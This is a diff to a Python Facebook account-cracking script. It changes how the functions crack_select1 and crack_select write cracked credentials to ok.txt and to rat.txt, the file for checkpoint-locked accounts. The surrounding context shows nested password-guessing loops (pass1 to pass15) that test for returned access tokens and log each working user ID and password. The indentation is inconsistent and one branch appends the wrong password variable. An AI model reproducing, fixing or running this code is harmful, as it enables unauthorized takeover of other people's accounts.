@@ -291,14 +291,14 @@ def crack_select1():
 			if "access_token" in data.text and "EAAA" in data.text:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
-				ok.write(uid+"|"+pass1+"\n")
+				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
-					cp.write(uid+"|"+pass1+"\n")
+					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
 				else:
@@ -310,14 +310,14 @@ def crack_select1():
 					if "access_token" in data.text and "EAAA" in data.text:
 						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
-						ok.write(uid+"|"+pass2+"\n")
+						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
 							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("rat.txt", "a")
-							cp.write(uid+"|"+pass2+"\n")
+							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
 						else:
@@ -329,14 +329,14 @@ def crack_select1():
 							if "access_token" in data.text and "EAAA" in data.text:
 								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
-								ok.write(uid+"|"+pass3+"\n")
+								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
 									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("rat.txt", "a")
-									cp.write(uid+"|"+pass3+"\n")
+									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
 								else:
@@ -348,14 +348,14 @@ def crack_select1():
 									if "access_token" in data.text and "EAAA" in data.text:
 										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
-										ok.write(uid+"|"+pass4+"\n")
+										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
 											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("rat.txt", "a")
-											cp.write(uid+"|"+pass4+"\n")
+											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
 										else:
@@ -367,14 +367,14 @@ def crack_select1():
 											if "access_token" in data.text and "EAAA" in data.text:
 												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
-												ok.write(uid+"|"+pass5+"\n")
+												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
 													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("rat.txt", "a")
-													cp.write(uid+"|"+pass5+"\n")
+													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
 												else:
@@ -386,14 +386,14 @@ def crack_select1():
 													if "access_token" in data.text and "EAAA" in data.text:
 														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
-														ok.write(uid+"|"+pass6+"\n")
+														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in data.json()['error_msg']:
 															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("rat.txt", "a")
-															cp.write(uid+"|"+pass6+"\n")
+															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
 														else:
@@ -405,14 +405,14 @@ def crack_select1():
 															if "access_token" in data.text and "EAAA" in data.text:
 																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
-																ok.write(uid+"|"+pass7+"\n")
+																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in data.json()['error_msg']:
 																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("rat.txt", "a")
-																	cp.write(uid+"|"+pass7+"\n")
+																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
 																	cps.append(uid+pass7)
 																else:
@@ -424,14 +424,14 @@ def crack_select1():
 																	if "access_token" in data.text and "EAAA" in data.text:
 																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
-																		ok.write(uid+"|"+pass8+"\n")
+																		ok.write(uid+" | "+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in data.json()['error_msg']:
 																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("rat.txt", "a")
-																			cp.write(uid+"|"+pass8+"\n")
+																			cp.write(uid+" | "+pass8+"\n")
 																			cp.close()
 																			cps.append(uid+pass8)
 																		else:
@@ -443,14 +443,14 @@ def crack_select1():
 																			if "access_token" in data.text and "EAAA" in data.text:
 																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
 																  			    ok = open("ok.txt", "a")
-																  			    ok.write(uid+"|"+pass9+"\n")
+																  			    ok.write(uid+" | "+pass9+"\n")
 																  			    ok.close()
 																  			    oks.append(uid+pass9)
 																			else:
 																  			        if "www.facebook.com" in data.json()['error_msg']:
 																  			                print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
 																  			                cp = open("rat.txt", "a")
-																  			                cp.write(uid+"|"+pass9+"\n")
+																  			                cp.write(uid+" | "+pass9+"\n")
 																  			                cp.close()
 																  			                cps.append(uid+pass9)
 																  			        else:		
@@ -462,14 +462,14 @@ def crack_select1():
 																					if "access_token" in data.text and "EAAA" in data.text:
 																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
 																						ok = open("ok.txt", "a")
-																						ok.write(uid+"|"+pass10+"\n")
+																						ok.write(uid+" | "+pass10+"\n")
 																						ok.close()
 																						oks.append(uid+pass10)
 																  			 		else:
 																  			        		if "www.facebook.com" in data.json()['error_msg']:
 																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
 																							cp = open("rat.txt", "a")
-																							cp.write(uid+"|"+pass10+"\n")
+																							cp.write(uid+" | "+pass10+"\n")
 																							cp.close()
 																							cps.append(uid+pass10)
 																						else:
@@ -481,14 +481,14 @@ def crack_select1():
 																							if "access_token" in data.text and "EAAA" in data.text:
 																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
 																								ok = open("ok.txt", "a")
-																								ok.write(uid+"|"+pass11+"\n")
+																								ok.write(uid+" | "+pass11+"\n")
 																								ok.close()
 																								oks.append(uid+pass11)
 																							else:
 																								if "www.facebook.com" in data.json()['error_msg']:
 																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
 																									cp = open("rat.txt", "a")
-																									cp.write(uid+"|"+pass11+"\n")
+																									cp.write(uid+" | "+pass11+"\n")
 																									cp.close()
 																									cps.append(uid+pass1)
 																								else:
@@ -500,14 +500,14 @@ def crack_select1():
 																									if "access_token" in data.text and "EAAA" in data.text:
 																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
 																										ok = open("ok.txt", "a")
-																										ok.write(uid+"|"+pass12+"\n")
+																										ok.write(uid+" | "+pass12+"\n")
 																										ok.close()
 																										oks.append(uid+pass12)
 																									else:
 																										if "www.facebook.com" in data.json()['error_msg']:
 																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
 																											cp = open("rat.txt", "a")
-																											cp.write(uid+"|"+pass12+"\n")
+																											cp.write(uid+" | "+pass12+"\n")
 																											cp.close()
 																											cps.append(uid+pass12)
 																										else:
@@ -519,14 +519,14 @@ def crack_select1():
 																											if "access_token" in data.text and "EAAA" in data.text:
 																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
 																												ok = open("ok.txt", "a")
-																												ok.write(uid+"|"+pass13+"\n")
+																												ok.write(uid+" | "+pass13+"\n")
 																												ok.close()
 																												oks.append(uid+pass13)
 																											else:
 																												if "www.facebook.com" in data.json()['error_msg']:
 																													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
 																													cp = open("rat.txt", "a")
-																													cp.write(uid+"|"+pass13+"\n")
+																													cp.write(uid+" | "+pass13+"\n")
 																													cp.close()
 																													cps.append(uid+pass13)
 																												else:
@@ -538,14 +538,14 @@ def crack_select1():
 																													if "access_token" in data.text and "EAAA" in data.text:
 																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
 																														ok = open("ok.txt", "a")
-																														ok.write(uid+"|"+pass14+"\n")
+																														ok.write(uid+" | "+pass14+"\n")
 																														ok.close()
 																														oks.append(uid+pass14)
 																													else:
 																														if "www.facebook.com" in data.json()['error_msg']:
 																															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
 																															cp = open("rat.txt", "a")
-																															cp.write(uid+"|"+pass14+"\n")
+																															cp.write(uid+" | "+pass14+"\n")
 																															cp.close()
 																															cps.append(uid+pass14)
 																														else:
@@ -557,14 +557,14 @@ def crack_select1():
 																															if "access_token" in data.text and "EAAA" in data.text:
 																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
 																																ok = open("ok.txt", "a")
-																																ok.write(uid+"|"+pass15+"\n")
+																																ok.write(uid+" | "+pass15+"\n")
 																																ok.close()
 																																oks.append(uid+pass15)
 																															else:
 																																if "www.facebook.com" in data.json()['error_msg']:
 																																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
 																																	cp = open("rat.txt", "a")
-																																	cp.write(uid+"|"+pass15+"\n")
+																																	cp.write(uid+" | "+pass15+"\n")
 																																	cp.close()											
 																																	cps.append(uid+pass15)
 																																
@@ -685,14 +685,14 @@ def crack_select():
 			if "access_token" in data.text and "EAAA" in data.text:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
-				ok.write(uid+"|"+pass1+"\n")
+				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
-					cp.write(uid+"|"+pass1+"\n")
+					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
 				else:
@@ -704,14 +704,14 @@ def crack_select():
 					if "access_token" in data.text and "EAAA" in data.text:
 						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
-						ok.write(uid+"|"+pass2+"\n")
+						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
 							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("rat.txt", "a")
-							cp.write(uid+"|"+pass2+"\n")
+							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
 						else:
@@ -723,14 +723,14 @@ def crack_select():
 							if "access_token" in data.text and "EAAA" in data.text:
 								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
-								ok.write(uid+"|"+pass3+"\n")
+								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
 									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("rat.txt", "a")
-									cp.write(uid+"|"+pass3+"\n")
+									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
 								else:
@@ -742,14 +742,14 @@ def crack_select():
 									if "access_token" in data.text and "EAAA" in data.text:
 										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
-										ok.write(uid+"|"+pass4+"\n")
+										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
 											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("rat.txt", "a")
-											cp.write(uid+"|"+pass4+"\n")
+											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
 										else:
@@ -761,14 +761,14 @@ def crack_select():
 											if "access_token" in data.text and "EAAA" in data.text:
 												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
-												ok.write(uid+"|"+pass5+"\n")
+												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
 													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("rat.txt", "a")
-													cp.write(uid+"|"+pass5+"\n")
+													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
 
